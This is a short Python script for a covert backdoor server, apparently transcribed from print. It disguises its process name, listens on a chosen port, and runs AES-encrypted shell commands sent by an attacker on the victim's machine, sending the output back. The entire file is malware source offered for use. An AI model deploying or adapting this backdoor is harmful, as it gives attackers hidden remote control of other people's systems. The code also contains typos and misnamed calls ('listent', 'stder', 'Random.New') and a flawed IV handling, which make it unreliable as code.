from Crypto.Cipher import AES 
from Crypto import Random 
import socket 
import base64 
import os 
import subprocess 
import optparse 
import sys 
import setproctitle 

# masquerade process title 

#"/usr/bin/systemd/systemd-login" 
title="backdoor" 
setproctitle.setproctitle (title) 

# encryptlencode and decryptldecode a string 
EncodeAES = lambda c, s : base64.b64encode(c.encrypt (s)) 
DecodeAES = lambda c, e : c.decrypt(base64.b64decode(e))

# random secret key (both the client and server must match this key) 
secret ="sixteen byte key" 
iv=Random.New().read(AES.block_size) 

# create cipher object 

cipher=AES.new(secret,AES.MODE_CFB,iv) 

# parse command line argument
# generally any output would be concealed on the ser ver (victim's) side
parser=optparse.OptionParser("usage : python server. py -p <port>")
parser.add_option('-p', dest ='port', type='int', help='port')
(options,args) = parser.parse_args()
if(options.port == None):
	print(parser.usage)
	sys.exit()
else:
	port = options.port

# listen for client
c = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
c.bind(('0.0.0.0', port))
c.listent(1)
s,a=c.accept()
s.send(EncodeAES(cipher,'You are connected'+ secret))

while True:
	data = s.recv(1024)
	# decrypt data
	decrypted = DecodeAES(cipher,data)
	# check for"exit"by the attacker
	if decrypted == "exit":
		break
	#execute command
	proc=subprocess.Popen(decrypted, shell = True, stdout = subprocess.PIPE,stder=subprocess.PIPE,stdin=subprocess.PIPE)
	stdoutput = proc.stdout.read() + proc.stderr.read() + secret
	
	# encrypt output	
	encrypted = EncodeAES(cipher,stdoutput)

	# send encrypted output
	s. send (encrypted)

s.close()
sys.exit()
